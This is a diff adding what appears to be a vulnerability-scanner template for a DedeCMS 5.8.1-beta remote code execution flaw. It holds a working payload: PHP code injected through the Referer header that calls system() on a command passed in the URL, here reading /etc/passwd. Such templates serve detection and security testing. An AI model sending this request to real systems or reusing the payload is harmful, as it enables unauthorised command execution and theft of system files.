@@ -1,0 +1,21 @@
+id: dedecms-rce
+brief:
+    title: DedeCMS 5.8.1-beta - Remote Code Execution
+    by: ritikchaddha
+    level: critical
+    about: DedeCMS 5.8.1-beta is susceptible to remote code execution via a variable override vulnerability that allows an attacker to construct malicious code with template file inclusion without proper auth...
+    label:
+        - dedecms
+        - cms
+        - rce
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/plus/flink.php?dopost=save&c=cat%20/etc/passwd'
+      head:
+        Referer: <?php "system"($c);die;/*ref
+      signs:
+        - "on": status
+          status:
+            - 200
